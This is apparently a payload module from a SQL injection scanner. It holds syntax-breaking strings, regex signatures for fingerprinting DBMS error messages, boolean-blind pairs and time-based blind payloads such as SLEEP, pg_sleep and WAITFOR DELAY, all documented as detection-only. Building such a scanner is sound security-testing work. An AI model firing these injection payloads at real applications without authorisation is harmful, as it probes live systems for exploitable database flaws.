"""Payloads and database error signatures.

All payloads are DETECTION-ONLY: they break or test query syntax, but never
read, modify or delete data (no UNION SELECT, no stacked INSERT/UPDATE/DROP).
Payloads are appended to the parameter's original value.
"""

import re

# Characters that break SQL string/number syntax and trigger a database error.
ERROR_PAYLOADS = ["'", '"', "')", '")', "\\", "'\""]

# Regex signatures of database error messages, used for error-based
# detection and for fingerprinting which DBMS is behind the application.
DB_ERROR_SIGNATURES = {
    "MySQL/MariaDB": [
        r"You have an error in your SQL syntax",
        r"check the manual that (?:corresponds|fits) to your (?:MySQL|MariaDB)",
        r"mysqli?_sql_exception",
        r"Warning.{1,80}mysqli?_",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"MariaDB server version",
        r"dialects[/\\](?:mysql|mariadb)[/\\]",       # Sequelize (Node.js) stack trace
    ],
    "PostgreSQL": [
        r"PostgreSQL.{0,40}ERROR",
        r"pg_(?:query|exec)\(\)",
        r"PSQLException",
        r"unterminated quoted string at or near",
        r"syntax error at or near",
        r"dialects[/\\]postgres[/\\]",
    ],
    "Microsoft SQL Server": [
        r"Unclosed quotation mark after the character string",
        r"Microsoft SQL Server",
        r"ODBC SQL Server Driver",
        r"SQLServerException",
        r"Incorrect syntax near",
        r"dialects[/\\]mssql[/\\]",
    ],
    "SQLite": [
        r"SQLite3?::",
        r"sqlite3\.OperationalError",
        r"SQLITE_ERROR",
        r"unrecognized token:",
        r"dialects[/\\]sqlite[/\\]",
    ],
    "Oracle": [
        r"\bORA-\d{5}",
        r"quoted string not properly terminated",
        r"Oracle.{0,20}Driver",
    ],
    # Framework/driver errors that prove a SQL failure but do not name the DBMS.
    "unknown (generic SQL error)": [
        r"SQLSTATE\[\w+\]",                # PHP PDO
        r"SequelizeDatabaseError",          # Node.js Sequelize ORM
        r"java\.sql\.SQLException",         # Java JDBC
        r"django\.db\.utils\.\w*Error",     # Python Django
        r"System\.Data\.SqlClient",          # .NET
    ],
}

COMPILED_SIGNATURES = {
    dbms: [re.compile(p, re.I) for p in patterns]
    for dbms, patterns in DB_ERROR_SIGNATURES.items()
}

# Boolean-based blind: (TRUE condition, FALSE condition) templates.
# {a} and {b} are replaced by two different random numbers, so a WAF or
# cache cannot simply memorise one fixed payload. One pair per quoting context.
BOOLEAN_PAIRS = [
    (" AND {a}={a}", " AND {a}={b}"),                    # numeric: id=1 AND 1=1
    ("' AND '{a}'='{a}", "' AND '{a}'='{b}"),            # single-quoted string
    ('" AND "{a}"="{a}', '" AND "{a}"="{b}'),            # double-quoted string
    ("' AND {a}={a}-- -", "' AND {a}={b}-- -"),          # single quote + comment
    (") AND {a}={a}-- -", ") AND {a}={b}-- -"),          # inside parentheses
]

# Time-based blind: (DBMS, template). {d} is the delay in seconds.
# A plain "OR SLEEP()" is NEVER used: it sleeps once for EVERY row in the table
# (measured: 13 s for a 1 s sleep on a 13-row table), an accidental DoS.
# Two safe forms are used instead:
#   * AND SLEEP(d): only runs when the original value matches a row.
#   * OR (SELECT 1 FROM (SELECT SLEEP(d))x)=2: the derived table is built ONCE,
#     so it sleeps exactly once, and "=2" is always false, so no rows are
#     returned (no login bypass). Works even when the original value matches
#     nothing, e.g. a login form's username field.
TIME_PAYLOADS = [
    ("MySQL/MariaDB", "' AND SLEEP({d})-- -"),
    ("MySQL/MariaDB", " AND SLEEP({d})"),
    ("MySQL/MariaDB", "\" AND SLEEP({d})-- -"),
    ("MySQL/MariaDB", "' OR (SELECT 1 FROM (SELECT SLEEP({d}))x)=2-- -"),
    ("MySQL/MariaDB", "\" OR (SELECT 1 FROM (SELECT SLEEP({d}))x)=2-- -"),
    ("MySQL/MariaDB", "') OR (SELECT 1 FROM (SELECT SLEEP({d}))x)=2-- -"),
    ("MySQL/MariaDB", "\") OR (SELECT 1 FROM (SELECT SLEEP({d}))x)=2-- -"),
    ("PostgreSQL", "' AND 1=(SELECT 1 FROM pg_sleep({d}))-- -"),
    ("PostgreSQL", " AND 1=(SELECT 1 FROM pg_sleep({d}))"),
    ("Microsoft SQL Server", "'; WAITFOR DELAY '0:0:{d}'-- -"),
    ("Microsoft SQL Server", "; WAITFOR DELAY '0:0:{d}'-- -"),
]
